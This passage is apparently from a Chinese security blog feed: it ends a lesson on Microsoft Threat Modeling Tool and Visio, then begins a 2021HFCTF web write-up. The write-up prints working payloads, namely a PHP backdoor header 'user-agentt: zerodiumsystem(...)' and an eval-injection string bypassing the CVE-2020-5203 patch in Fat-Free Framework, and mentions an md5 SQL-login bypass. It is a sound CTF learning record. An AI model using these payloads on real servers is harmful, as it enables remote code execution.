href="#如何添加元素属性" class="headerlink" title="如何添加元素属性"></a>如何添加元素属性</h6><p>如果有必须包括在默认模板中的其他属性，可以在管理员视图中将其添加到每个元素。</p><p><img src="/img/thread-modeling/stencilpropertiesadmin.jpeg" class="lazyload" data-srcset="/img/thread-modeling/stencilpropertiesadmin.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="stencilpropertiesadmin"></p><p>当用户将该元素拖放到画布上时，将看到自己的更改。</p><p><img src="/img/thread-modeling/stencilproperties.jpeg" class="lazyload" data-srcset="/img/thread-modeling/stencilproperties.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="stencilproperties"></p><h5 id="威胁属性"><a href="#威胁属性" class="headerlink" title="威胁属性"></a>威胁属性</h5><p>使用属性可以创建为每个生成的威胁填充的字段，就像使用模具属性可以为每个元素创建字段一样。</p><p><u><strong>请记住：目标是以最简单的方式获得尽可能多的上下文。</strong></u></p><h6 id="威胁属性的示例"><a href="#威胁属性的示例" class="headerlink" title="威胁属性的示例"></a>威胁属性的示例</h6><p><strong>管理员视图</strong></p><p>添加可为你提供更多上下文和可操作步骤的字段。 示例包括：</p><ul><li>问题优先级 - 了解需要首先处理哪些问题</li><li>超链接 - 将问题链接到联机文档</li><li>外部风险映射 - 通过使用可靠的第三方源（如 OWASP Top 10 和 CWE 详细信息），使用与其他组织相同的语言来描述风险</li></ul><p><img src="/img/thread-modeling/threatadminview.jpeg" class="lazyload" data-srcset="/img/thread-modeling/threatadminview.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threatadminview"></p><p>啊这，超链接和外部风险在哪 （</p><p><strong>用户视图</strong></p><p>Threat Modeling Tool 用户将在分析其数据流关系图时看到这些更改。</p><p><img src="/img/thread-modeling/threatuserview.jpeg" class="lazyload" data-srcset="/img/thread-modeling/threatuserview.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threatuserview"></p><h4 id="威胁和风险降低策略"><a href="#威胁和风险降低策略" class="headerlink" title="威胁和风险降低策略"></a>威胁和风险降低策略</h4><p>这一部分是 Threat Modeling Tool 的核心。 威胁生成引擎考察独立元素和已连接的元素，以确定生成哪个威胁。</p><h5 id="威胁生成的原理"><a href="#威胁生成的原理" class="headerlink" title="威胁生成的原理"></a>威胁生成的原理</h5><h6 id="步骤-1-指定源和目标"><a href="#步骤-1-指定源和目标" class="headerlink" title="步骤 1 - 指定源和目标"></a>步骤 1 - 指定源和目标</h6><p>威胁生成引擎使用简单的句子来生成威胁。 示例包括：</p><ul><li>目标为[元素名称]</li><li>源为[元素名称]</li></ul><p>你还可以在标题和说明中使用元素名称。 格式为：“{target.Name}”或“{source.Name}”</p><h6 id="步骤-2-合并源和目标"><a href="#步骤-2-合并源和目标" class="headerlink" title="步骤 2 - 合并源和目标"></a>步骤 2 - 合并源和目标</h6><p>你可以精确规定如何生成威胁。 用 AND OR 运算符组合目标、源及其各个属性。 示例包括：</p><ul><li>target.[property name] is ‘Yes’ <strong>AND</strong> source.[property name] is ‘No’</li><li>流交叉[信任边界名称]</li></ul><h6 id="步骤-3-生成或忽略威胁"><a href="#步骤-3-生成或忽略威胁" class="headerlink" title="步骤 3 - 生成或忽略威胁"></a>步骤 3 - 生成或忽略威胁</h6><p>威胁生成引擎使用两个字段来生成或忽略威胁：</p><ul><li><strong>Include</strong> - 如果在此字段中添加的句子为 true，则会生成威胁</li><li><strong>Exclude</strong> - 如果在此字段中添加的句子为 true，则不会生成威胁</li></ul><p>下面是默认模板的实际示例，以便将这些步骤结合在一起：</p><ul><li><strong>威胁：</strong> 跨站点脚本</li><li><strong>Include:</strong> (target is [Web Server]) <strong>OR</strong> (target is [Web Application])</li><li><strong>Exclude:</strong> (target.[Sanitizes Output] is ‘Yes’) <strong>AND</strong> (target.[Sanitizes Input] is ‘Yes’)</li></ul><p>仅在以下情况时才会生成上述跨站点脚本威胁：</p><ul><li>进程是 Web 服务器或 Web 应用程序</li><li>未净化输入和输出</li></ul><p><img src="/img/thread-modeling/includeexclude.jpeg" class="lazyload" data-srcset="/img/thread-modeling/includeexclude.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="includeexclude"></p><div class="note info"><p>Microsoft Threat Modeling Tool 模板创建 主题很复杂，本学习路径中不会进行充分讨论。</p></div><h4 id="知识检查-21"><a href="#知识检查-21" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>Threat Modeling Tool 不提供哪些优势？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 生成的威胁基于整个关系图，而不仅是每个元素或每次交互。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 可以更改威胁、模具和模具属性。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 生成每个威胁时，都会包含降低或消除风险的方法。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 该工具仅考察各个元素和各次交互。B. 可以更改字段。C. 某些模板只包含威胁，但较新版本确实包含风险降低策略。</psw></p><h3 id="Visio"><a href="#Visio" class="headerlink" title="Visio"></a>Visio</h3><p>Visio 归为 Microsoft 所有，其功能强大，可帮助任何人创建优质的流程图和数据流关系图。</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>Visio 提供拖放功能和关系图批注功能。 在为系统创建关系图时，这两种功能都很有用。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>该应用程序不提供自动威胁建模功能。 因此，没有威胁生成引擎来帮助工程师集体讨论威胁和风险降低策略。</p><div class="note info"><p>如果使用 Visio，你将负责对每个元素和交互进行手动威胁建模。</p></div><h4 id="知识检查-22"><a href="#知识检查-22" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>Visio 不提供哪些优势？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 使用默认模具提供拖放功能。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 输出一系列生成的威胁，帮助工程师集体讨论可以如何降低或消除风险。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 让工程师可以为数据流图表添加批注以提供服务上下文。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 它确实提供拖放功能。B. Visio 没有威胁生成引擎。C. 它提供批注功能。</psw></p><h3 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h3><p>你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 Microsoft 的工程师推荐几个工具来帮助你进行威胁建模。</p><p>你了解了可用于创建数据流关系图的不同工具。</p><p>在本模块中，你已经学习了以下内容：</p><ul><li>详细了解了 Threat Modeling Tool</li><li>详细了解了 Visio</li></ul><div class="note info"><p>还有很多其他工具可以帮助你解决威胁建模需求。 其中某些工具需要付费订阅才能使用，另一些则完全开放源代码。 你甚至可以使用白板，其学习难度较低，但以威胁建模专业知识为使用前提，并且难以保存。</p></div><h4 id="了解详细信息-2"><a href="#了解详细信息-2" class="headerlink" title="了解详细信息"></a>了解详细信息</h4><div class="tag link"><a class="link-card" title="Threat Modeling Tool" href="https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool"><div class="left"><img src="https://s.getwinpcsoft.com/icons/png/128/5216/5216902.png" class="lazyload" data-srcset="https://s.getwinpcsoft.com/icons/png/128/5216/5216902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">Threat Modeling Tool</p><p class="url">https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool</p></div></a></div><div class="tag link"><a class="link-card" title="Visio" href="https://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software"><div class="left"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4k7FT?ver=a8bc" class="lazyload" data-srcset="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4k7FT?ver=a8bc" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">Visio</p><p class="url">https://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software</p></div></a></div><p>完结撒花~ ~</p>]]></content>
      
      
      <categories>
          
          <category> SDL </category>
          
          <category> 威胁建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SDL </tag>
            
            <tag> 威胁建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HFCTF Web Writeup</title>
      <link href="//p/2021/2021hfctf/"/>
      <url>//p/2021/2021hfctf/</url>
      
        <content type="html"><![CDATA[<p>internal_system 挺有意思的，复现完学到了刷多 （</p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>考点：PHP供应链攻击</p><p>php 近期爆的漏洞，一开始就看到了，</p><p><img src="/img/2021hfctf/image-20210403190259626.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190259626.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190259626"></p><p>喔？你说这个我可就不困了，（我是个爱看新闻的好孩子 逃</p><img src="/img/2021hfctf/image-20210403175010155.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175010155.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175010155" style="zoom:50%;" /><p>但是，，User-Agentt 看成了 User-Agent，，没成，然后被另一个地方吸住了眼球，在搞 guestbook.php 草。。</p><p>直到官方放出提示，我不信邪在看了一遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agentt: zerodiumsystem(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210403175138664.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175138664.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175138664"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>考点：CVE-2020-5203 补丁绕过</p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"><span class="comment">// $f3 = Base::instance();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p>也是有故事</p><p><img src="/img/2021hfctf/image-20210403175307159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175307159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175307159"></p><p>开开心心本地分析了一波弄出来了，线上一打，啥返回都没= =，，我在想..</p><p>你这不是考察 CVE-2020-5203 根据 3.7.2的代码修改记录 <a href="https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829">https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829</a> 来写 3.7.1 的exp么？</p><p>你不是。。3.7.2 吧？晕，于是想办法找，找到了 changlog 来确定版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib/CHANGELOG.md</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210403194520727.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403194520727.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403194520727"></p><p>草，慢慢分析吧，其实漏洞触发点是类似的</p><p><img src="/img/2021hfctf/image-20210403175851985.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175851985.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175851985"></p><p><img src="/img/2021hfctf/image-20210403175931732.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175931732.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175931732"></p><p>由上两图，<code>$f3</code> 是 <code>Base</code> 实例，这个类重载了 <code>__unset</code> 魔术方法，然后这个 <code>$key</code> 参数是可控的</p><p><img src="/img/2021hfctf/image-20210403180041983.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180041983.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180041983"></p><p>也就是说，调用 <code>unset($f3-&gt;$a);</code> 会触发该魔术方法，跟进 <code>$this-&gt;offsetunset</code> 方法，调用 <code>$this-&gt;clear</code> 方法</p><p><img src="/img/2021hfctf/image-20210403180152159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180152159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180152159"></p><p>继续跟进，</p><p><img src="/img/2021hfctf/image-20210403180437548.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180437548.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180437548"></p><p>刚刚说到，这个 <code>$key</code> 参数是可控的，也就是说，这个 <code>eval</code> 里的 <code>$val</code> 是可控的</p><p><img src="/img/2021hfctf/image-20210403180630972.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180630972.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180630972"></p><p>问题是，3.7.2 版本打过补丁， <code>$this-&gt;compile</code>  方法和之前的不同，如果用 3.7.1 版本的exp 打，断点调试，会发现最终 <code>$val</code> 构造出来是类似于 <code>&quot;[&#39;xxx;eval_code&#39;]&quot;</code> ，无论怎样都会被包括在引号里的。</p><p>先传入 <code>/?a=s</code></p><p><img src="/img/2021hfctf/image-20210403183838570.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403183838570.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403183838570"></p><p>右边红框框住的部分和原本有点不一样，就是把写在一起的提取出来，赋值到变量里方便查看变化</p><p>经过 <code>$this-&gt;compile</code> 预处理值 <code>$pre</code> 为 <code>$hive[&#39;s&#39;]</code> ，</p><p>要后被 <code>eval</code> 的部分 <code>$pinjie</code> 为 <code>&quot;unset($this-&gt;hive[&#39;s&#39;]);&quot;</code> 。</p><p>到这里我们明白了大概的数据流，即设法构造 <code>$_GET[&#39;a&#39;]</code> 使我们的恶意代码可以被 <code>eval</code></p><p>这里绕过有两个点</p><ul><li>数组闭合</li><li>注释闭合多余部分</li></ul><p>继续尝试构造传入 <code>a=s[]);</code></p><p><img src="/img/2021hfctf/image-20210403184354702.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403184354702.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403184354702"></p><p>可以看到 <code>$pre</code> 部分已经成功被闭合了，但是有个问题，</p><p> <code>$pinjie</code> 部分拼接不正常</p><p><code>unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]);</code> 这部分正常，但多了 <code>);</code></p><div class="note quote"><p>至于为什么我这么熟练，直接用数组给闭合了，，因为一开始，，在分析 3.7.1 时，把代码流，包括 <code>$this-&gt;compile</code> 部分给整明白了，然后 3.7.2 重构了 <code>$this-&gt;compile</code> 很类似，有兴趣可以去看看，就是正则有点多和复杂。。。看的头皮发麻</p></div><p>尝试传入 <code>a=s[]);phpinfo();//</code> 这样，反正后面多了的 <code>);</code> 会被注释掉（好像和我新年出的 CTF 有点像，要闭合加注释），断点看看呗</p><p><img src="/img/2021hfctf/image-20210403185337497.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185337497.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185337497"></p><p><img src="/img/2021hfctf/image-20210403185407122.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185407122.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185407122"></p><p>然后线上环境 cat 一下就好了</p><p><img src="/img/2021hfctf/image-20210403185505318.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185505318.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185505318"></p><h2 id="“慢慢做”-管理系统"><a href="#“慢慢做”-管理系统" class="headerlink" title="“慢慢做” 管理系统"></a>“慢慢做” 管理系统</h2><p>没做出来，写思路，后续补上</p><p>提示</p><blockquote><p>第一步登录的sql语句是”SELECT * FROM users WHERE password = ‘“.md5($password,true).”‘ limit 0,1”;</p></blockquote><p>元老级 <code>md5($password,true)</code> 绕过，以前实验吧刷过，可以看以下链接</p><p><a href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p><p>但是。。黑人问号.jpg </p><p><img src="/img/2021hfctf/image-20210403190124297.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190124297.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190124297"></p><p>好，你说题目描述重要</p><blockquote><p><strong>这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。</strong></p></blockquote><p>完全不知道 ssrf 的点在哪，一共就发现 index.php admin.php 和 flag.php 三个文件，好了，没思路了。（还是太菜了</p><p>emm，看来别人的wp，发现原来，，除了 ffifdyop 还有其他的，晕….</p><p>坐等 buu 出复现 （</p><p>5月6更</p><hr><p>buu 群问了下，说不会出复现环境了，参考其他师傅的题解吧~</p><p><a href="https://www.zhaoj.in/read-6885.html#WEB1">https://www.zhaoj.in/read-6885.html#WEB1</a></p><h2 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h2><p>没做出来，但是感觉接近了</p><p>admin/admin 一把梭，</p><p><img src="/img/2021hfctf/image-20210403190428006.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190428006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190428006"></p><p>密码竟然是错的，不过有提示</p><p>访问 <code>/source</code> 获取源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 